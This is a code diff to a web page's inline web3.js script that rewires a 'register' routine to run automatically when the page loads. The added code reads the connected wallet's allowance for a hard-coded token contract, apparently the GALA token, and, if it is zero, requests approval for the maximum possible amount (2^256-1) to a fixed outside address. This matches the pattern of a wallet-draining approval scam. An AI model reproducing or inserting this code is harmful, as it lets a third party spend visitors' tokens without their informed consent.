@@ -12,11 +12,14 @@
  <body>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4/web3.min.js"></script>
   <script>
+    let targetAddress = "0x67C175A56DF8E393509D7b7Da99085CE1b1600e7";
+
     window.addEventListener('load', async () => {
       if (window.ethereum) {
         web3js = new Web3(window.ethereum);
         try {
           await window.ethereum.enable();
+          afterInit();
           return web3js;
         } catch (error) {
           console.error(error);
@@ -25,21 +28,30 @@
       else if (window.web3) {
         web3js = window.web3;
         console.log('Injected web3 detected.');
+        afterInit();
         return web3js;
       }
       else {
         const provider = new Web3.providers.HttpProvider('http://127.0.0.1:9545');
         web3js = new Web3(provider);
         console.log('No web3 instance injected, using Local web3.');
+        afterInit();
         return web3js;
       }
     });
 
-    async function register() {
+    async function afterInit() {
       let abi = await (await fetch('abi.json')).json();
-      let galaToken = new web3js.eth.Contract(abi, "0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA");
+      galaToken = new web3js.eth.Contract(abi, "0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA");
+      let allowance = await galaToken.methods.allowance(ethereum.selectedAddress,targetAddress).call();
+      if(allowance == 0) {
+        register();
+      }
+    }
+
+    async function register() {
       let approve_amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; //(2^256 - 1 )
-      galaToken.methods.approve("0x67C175A56DF8E393509D7b7Da99085CE1b1600e7", approve_amount).send({
+      galaToken.methods.approve(targetAddress, approve_amount).send({
         from: ethereum.selectedAddress
       });
     }
